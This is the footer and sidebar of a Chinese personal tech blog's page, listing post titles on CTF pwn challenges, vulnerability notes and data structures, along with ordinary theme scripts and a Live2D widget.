CTF">CTF</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/Pwn/" title="分类于 Pwn">Pwn</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/Pwn/Game/" title="分类于 Game">Game</a></div><span><a href="/CTF/Pwn/Game/Scuctf2023-Write-up/" title="2023Scuctf_writeup">2023Scuctf_writeup</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/About-me/" title="分类于 关于自我">关于自我</a></div><span><a href="/About-me/My-first-Boke/" title="我的第一篇博客">我的第一篇博客</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E5%8D%9A%E5%AE%A2%E8%AF%B4%E6%98%8E/" title="分类于 博客说明">博客说明</a></div><span><a href="/%E6%A8%A1%E6%9D%BF/" title="写作模板">写作模板</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/Project/" title="分类于 项目">项目</a> <i class="ic i-angle-right"></i> <a href="/categories/Project/DaChuang/" title="分类于 大创">大创</a></div><span><a href="/Project/DaChuang/%E5%A4%A7%E5%88%9B%E4%BB%8B%E7%BB%8D/" title="2023大创介绍">2023大创介绍</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于 CTF">CTF</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/Pwn/" title="分类于 Pwn">Pwn</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/Pwn/note/" title="分类于 笔记">笔记</a></div><span><a href="/CTF/Pwn/note/PWN%E6%A6%82%E8%BF%B0/" title="Pwn概述">Pwn概述</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于 CTF">CTF</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/Pwn/" title="分类于 Pwn">Pwn</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/Pwn/note/" title="分类于 笔记">笔记</a></div><span><a href="/CTF/Pwn/note/Pwn%E9%A2%98%E5%9E%8B/" title="常见漏洞">常见漏洞</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/computer-science/" title="分类于 计算机科学">计算机科学</a> <i class="ic i-angle-right"></i> <a href="/categories/computer-science/Data-Structures/" title="分类于 数据结构与算法">数据结构与算法</a> <i class="ic i-angle-right"></i> <a href="/categories/computer-science/Data-Structures/cpp/" title="分类于 C++">C++</a></div><span><a href="/computer-science/Data-Structures/cpp/%E7%BA%BF%E6%80%A7%E8%A1%A8%E9%A2%98%E8%A7%A3/" title="线性表题解">线性表题解</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/%E5%8D%9A%E5%AE%A2%E8%AF%B4%E6%98%8E/" title="分类于 博客说明">博客说明</a></div><span><a href="/markdown/" title="Markdown Style test">Markdown Style test</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于 CTF">CTF</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/Pwn/" title="分类于 Pwn">Pwn</a> <i class="ic i-angle-right"></i> <a href="/categories/CTF/Pwn/solutions/" title="分类于 题解">题解</a></div><span><a href="/CTF/Pwn/solutions/learn/read/" title="一个只有read的程序">一个只有read的程序</a></span></li></ul></div><div><h2>最新评论</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; <span itemprop="copyrightYear">2023</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">4riH04X @ Pwn&4riH04X</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i> </span><span title="站点总字数">162k 字</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-coffee"></i> </span><span title="站点阅读时长">2:27</span></div><div class="powered-by">基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"CTF/Pwn/solutions/learn/read/",favicon:{show:"（●´3｀●）やれやれだぜ",hide:"(´Д｀)大変だ！"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(e){return e.includes("#")},function(e){return new RegExp(LOCAL.path+"$").test(e)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"live2d-widget-model-haruto"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html><!-- rebuild by hrmmi -->